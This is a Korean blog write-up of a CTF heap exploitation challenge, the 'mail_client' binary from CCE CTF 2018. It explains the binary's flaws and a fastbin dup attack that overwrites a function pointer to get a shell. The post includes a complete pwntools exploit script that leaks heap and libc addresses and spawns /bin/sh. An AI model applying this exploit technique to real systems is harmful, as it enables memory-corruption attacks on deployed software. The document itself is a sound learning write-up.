---
title: CCE CTF 2018 - red5_1aadde7c3b mail_client
date: 2018-10-04 00:10:53
categories:
- Heap Exploit
- CTF writeup
tags:
- Fastbin Dup attack
---


```c
FMAIL version 1.0 uid=1000 gid=1000
AUTH: Plaintext
Compiler: GCC
Library: Glibc
```

..정말 취약점은 쉽고 익스가 힘들었던 문제



일단 눈에 보이는 이상한 점은

1. mail의 body에 40개 만큼 넣으면 file을 malloc 한 주소 leak이 가능하다.
2. file 할당 시 size 검사를 안한다.
3. free하는 mail의 index 검사를 안한다.
4. logout 후 다시 register 할 때 malloc을 안한다. (free 영역에 계속 쓸 수 있음)
5. file 을 modify 할 때 구조체 안의 함수 포인터를 사용한다.



이상한 점은 정말 많은데 memset 때문에 익스할 때 번번히 막혔다..

archive 메뉴는 아직도 어떻게 쓰는 지 모르겠다..ㅋㅋㅋㅋㅋㅋㅋ 듣기로는 익스 방법은 진짜 가지각색이라고 함..

top chunk 덮어서 orange 처럼 free 한 다음 leak 하려고도 했는데 eof 가 떠서 못했다. 이건 아직도 왜그런지 모르겠음..



내가 쓴 구조체

```c
struct my
{
  char email[40];
  char pass[40];
};
```

```c
struct mail
{
  char to[20];
  char subject[20];
  char body[40];
  __int64 file_pointer;
  __int64 (__fastcall *FILE)(__int64, __int64);
};
```

```c
struct list
{
  mail *mail;
};
```



내가 한 방법은 1번을 이용해 heap 영역을 leak 하고 2번을 이용해 mmap으로 할당하게 해서 libc 주소를 구했다. 원래 libc leak을 이 방법이 아니라 딴 걸 생각 햇는데 이것 때문에 삽질엄청했다.

그리고 메뉴를 입력할때 19 bytes 만큼 받아서 메뉴 입력 한 뒤 원하는 주소를 넣을 수 있다. 여기에 원하는 chunk 영역을 넣고 3번을 이용해 내 맘대로 free 할 수 있다. ~~근데 memset 함..짜증..~~

하지만 4번이 있으므로 fastbin dup attack을 할 수 있다. 이걸 5번 함수 포인터 근처에 fake chunk를 넣고 할당 받은 뒤 overwrite 하면 쉘이 따인다. 짜잔

주의할 점은 함수 포인터 부르는게 지금 쓰는 mail 구조체라 여기에 넣어야 함. 그리고 one_shot 안되서 login mail부분에 "/bin/sh" 넣어서 system 함수 써야함(free 된 영역이라 0x50 malloc 하면 쓸 수 있다.)



```python
from pwn import *
from time import *

w = process("./mail_client")

def register(mail, pw):
	w.sendline('REG')
	w.sendline(mail)
	w.sendline(pw)

def login(mail, pw):
	w.sendline("LOGIN")
	w.sendline(mail)
	w.sendline(pw)

def logout():
	w.sendline("LOGOUT")

def send(to, subject, body, attach):
	w.sendline("SEND")
	w.sendline(to)
	w.sendline(subject)
	w.send(body)
	w.sendline(str(attach))

def recv():
	w.sendline("RECV")

def trash(idx):
	w.sendline("TRASH")
	w.sendline(str(idx))

def archive(idx):
	w.sendline("ARCHIVE")
	w.sendline(str(idx))

def att_file(size, content, mod):
	w.sendline(str(size))
	w.sendline(content)
	w.sendline(str(mod))

def leak():
	w.recvline()
	w.recvline()
	heap = w.recvline()[41:-2]
	return u64(heap.ljust(8,"\x00"))
	

register("wally0813@","wally0813")
login("wally0813@","wally0813")

# heap leak
send("wally0813","wally0813","w"*40,1)
att_file(0x50,"wally0813",2)

w.recv()
recv()
heap_base = leak()-0xe0
log.info("Heap_Base ::"+hex(heap_base))

# mmap
send("wally0813","wally0813","w"*40,1)
att_file(0xfffffff,"wally0813",2)

# libc leak
send("wally0813","wally0813","w"*40,1)
att_file(0x500,"wally0813",2)

recv()
w.recvuntil('[1]')
libc_base = (leak()& 0xffffffff000)+0x700010001000
log.info("Libc_base ::"+hex(libc_base))
system = libc_base + 0x45390

# fastbin dup attack in heap
w.sendline("TRASH".ljust(8,"\x00")+p64(heap_base+0x10))
w.sendline("11")

w.sendline("TRASH".ljust(8,"\x00")+p64(heap_base+0xe0))
w.sendline("11")

logout()

fake = heap_base+0x760

register(p64(fake),"wally0813")
login(p64(fake),"wally0813")

send("w","w",p64(0)*2+p64(0x60)+p64(heap_base+0x10)+p64(heap_base+0x10),1)

# overwrite function pointer
att_file(0x50,"/bin/sh\x00",1)
att_file(0x50,"1"*0x10+p64(system)*2,1)

w.interactive()

```

다 풀고 나니 생각보다 별거 아닌데 삽질을 엄청했다. 이상하게 요즘 푸는 문제 버퍼가 다 이상하다... ~~내가 이상하게 줬겠지..~~

